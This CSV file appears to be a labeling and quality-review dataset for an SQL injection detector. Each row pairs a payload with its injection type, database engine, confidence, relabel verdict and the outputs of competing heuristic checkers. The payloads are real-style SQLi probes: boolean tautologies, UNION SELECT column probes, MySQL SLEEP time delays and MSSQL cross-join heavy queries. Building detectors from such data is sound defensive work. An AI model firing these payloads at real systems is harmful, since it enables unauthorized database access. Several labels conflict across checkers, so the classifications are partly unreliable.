payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,payload_inner,wrapper_detected,strip_depth,a_type,a_db,a_signals,c_type,c_db,c_signals
1' ) where 2090 = 2090,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,1' ) where 2090 = 2090,False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
1' and 1661 = 1244 and 'dcha' = 'dcha,boolean_blind,generic,0.5,and_equality,RELABEL,reasoning too short (12 chars); confidence too low (0.50),boolean_blind,generic,1' and 1661 = 1244 and 'dcha' = 'dcha,False,0,boolean_blind,generic,Pattern match: 'and 1661 = 1244' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
"-1372%' ) ) ) union all select 8403,8403,8403,8403#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-1372%' ) ) ) union all select 8403,8403,8403,8403#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
1 where 9774 = 9774,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,1 where 9774 = 9774,False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
1 ) ) and 3249 = 2985,boolean_blind,generic,0.5,inequality,RELABEL,reasoning too short (10 chars); confidence too low (0.50),boolean_blind,generic,1 ) ) and 3249 = 2985,False,0,boolean_blind,generic,Pattern match: 'and 3249 = 2985' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1' ) as fxuk where 6184 = 6184 and make_set ( 9292 = 2785,2785 ) --",boolean_blind,mysql,0.7,make_set,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,"1' ) as fxuk where 6184 = 6184 and make_set ( 9292 = 2785,2785 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"1 ) ) as jfae where 6684 = 6684 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,mssql,0.7,mssql_sysjoin,RELABEL,reasoning too short (13 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1 ) ) as jfae where 6684 = 6684 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"1 ) ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,generic,0.7,domain_join,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1 ) ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"1' ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,0.7,elt_sleep,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,"1' ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
"1"" ) ) as tmpz where 7224 = 7224 and make_set ( 3579 = 1045,1045 ) --",boolean_blind,mysql,0.7,make_set,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,"1"" ) ) as tmpz where 7224 = 7224 and make_set ( 3579 = 1045,1045 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"-1084 where 1181 = 1181 or make_set ( 9354 = 9354,7185 ) --",boolean_blind,mysql,0.7,make_set,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,"-1084 where 1181 = 1181 or make_set ( 9354 = 9354,7185 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
